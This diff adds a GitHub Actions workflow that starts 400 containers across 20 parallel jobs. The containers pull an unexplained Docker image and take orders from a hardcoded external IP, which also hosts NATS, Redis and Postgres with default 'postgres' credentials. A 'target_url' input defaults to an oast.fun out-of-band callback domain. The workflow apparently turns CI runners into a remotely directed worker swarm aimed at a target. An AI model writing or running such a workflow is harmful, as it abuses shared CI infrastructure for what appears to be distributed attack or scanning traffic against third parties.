@@ -1,0 +1,129 @@
+name: MCP 400 Workers - 20 Jobs × 20 Containers
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Base target URL'
+        required: true
+        default: 'asdfazrcdfgqoiuibvkf934exsjcoluvq.oast.fun'
+      runtime_minutes:
+        description: 'Runtime in minutes'
+        required: false
+        default: '30'
+
+env:
+  MANAGER_HOST: 165.232.134.47
+  NATS_HOST: 165.232.134.47
+  NATS_PORT: 4222
+  REDIS_HOST: 165.232.134.47
+  REDIS_PORT: 6379
+  POSTGRES_HOST: 165.232.134.47
+  POSTGRES_PORT: 5432
+  POSTGRES_DB: mcp_manager
+  POSTGRES_USER: postgres
+  POSTGRES_PASSWORD: postgres
+  DOCKER_IMAGE: test123434sdd/mcp-remote-worker:latest
+
+jobs:
+  spawn-100-workers:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    strategy:
+      matrix:
+        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]  # 5 jobs
+      fail-fast: false
+    
+    steps:
+      - name: 🔍 Checkout
+        uses: actions/checkout@v4
+
+      - name: 🔑 Docker Login
+        uses: docker/login-action@v3
+        with:
+          username: test123434sdd
+          password: ${{ secrets.DOCKER_TOKEN }}
+
+      - name: 🌐 Test Connectivity
+        run: |
+          echo "Testing connectivity to manager..."
+          nc -zv -w5 ${{ env.NATS_HOST }} ${{ env.NATS_PORT }} && echo "✅ NATS OK"
+          nc -zv -w5 ${{ env.POSTGRES_HOST }} ${{ env.POSTGRES_PORT }} && echo "✅ PostgreSQL OK"
+
+      - name: 🐳 Pull Docker Image
+        run: docker pull ${{ env.DOCKER_IMAGE }}
+
+      - name: 🚀 Spawn 20 Docker Workers (Job ${{ matrix.job_id }})
+        run: |
+          echo "═══════════════════════════════════════════════════════"
+          echo "🚀 Job ${{ matrix.job_id }}: Spawning 20 Docker Workers"
+          echo "═══════════════════════════════════════════════════════"
+          
+          # Spawn 20 containers in parallel
+          for i in {1..20}; do
+            WORKER_NUM=$(( (${{ matrix.job_id }} - 1) * 20 + $i ))
+            WORKER_NAME="worker-${{ github.run_id }}-job${{ matrix.job_id }}-${i}"
+            WORKER_ID="github-worker-${{ github.run_id }}-${WORKER_NUM}"
+            
+            echo "Starting Worker #$WORKER_NUM: $WORKER_ID"
+            
+            docker run -d \
+              --name $WORKER_NAME \
+              -e WORKER_ID="$WORKER_ID" \
+              -e WORKER_TAGS="github,job${{ matrix.job_id }},worker${WORKER_NUM}" \
+              -e MANAGER_HOST="${{ env.MANAGER_HOST }}" \
+              -e NATS_HOST="${{ env.NATS_HOST }}" \
+              -e NATS_PORT="${{ env.NATS_PORT }}" \
+              -e REDIS_HOST="${{ env.REDIS_HOST }}" \
+              -e REDIS_PORT="${{ env.REDIS_PORT }}" \
+              -e REDIS_PASSWORD="" \
+              -e POSTGRES_HOST="${{ env.POSTGRES_HOST }}" \
+              -e POSTGRES_PORT="${{ env.POSTGRES_PORT }}" \
+              -e POSTGRES_DB="${{ env.POSTGRES_DB }}" \
+              -e POSTGRES_USER="${{ env.POSTGRES_USER }}" \
+              -e POSTGRES_PASSWORD="${{ env.POSTGRES_PASSWORD }}" \
+              ${{ env.DOCKER_IMAGE }} &
+            
+            # Small delay to avoid overwhelming the system
+            sleep 0.5
+          done
+          
+          # Wait for all containers to start
+          wait
+          echo "✅ All 20 workers spawned for Job ${{ matrix.job_id }}"
+          
+          # Show running containers
+          docker ps --format "table {{.Names}}\t{{.Status}}" | grep "worker-${{ github.run_id }}"
+
+      - name: 🔴 Keep Workers Running
+        run: |
+          echo "═══════════════════════════════════════════════════════"
+          echo "🔴 Job ${{ matrix.job_id }}: Workers Running"
+          echo "═══════════════════════════════════════════════════════"
+          
+          RUNTIME_SECONDS=$(( ${{ github.event.inputs.runtime_minutes }} * 60 ))
+          END_TIME=$(($(date +%s) + RUNTIME_SECONDS))
+          
+          echo "⏱️  Runtime: ${{ github.event.inputs.runtime_minutes }} minutes"
+          echo "📊 Workers: 20 containers"
+          echo "🔗 Manager: ${{ env.MANAGER_HOST }}"
+          echo ""
+          
+          while [ $(date +%s) -lt $END_TIME ]; do
+            RUNNING=$(docker ps -q -f name="worker-${{ github.run_id }}-job${{ matrix.job_id }}" | wc -l)
+            echo "[$(date '+%H:%M:%S')] Job ${{ matrix.job_id }}: $RUNNING/20 workers running"
+            sleep 30
+          done
+          
+          echo "⏱️  Runtime complete for Job ${{ matrix.job_id }}"
+
+      - name: 🛑 Cleanup
+        if: always()
+        run: |
+          echo "🛑 Stopping all workers for Job ${{ matrix.job_id }}..."
+          docker ps -q -f name="worker-${{ github.run_id }}-job${{ matrix.job_id }}" | xargs -r docker stop
+          docker ps -aq -f name="worker-${{ github.run_id }}-job${{ matrix.job_id }}" | xargs -r docker rm
+          echo "✅ Cleanup complete"
+
+
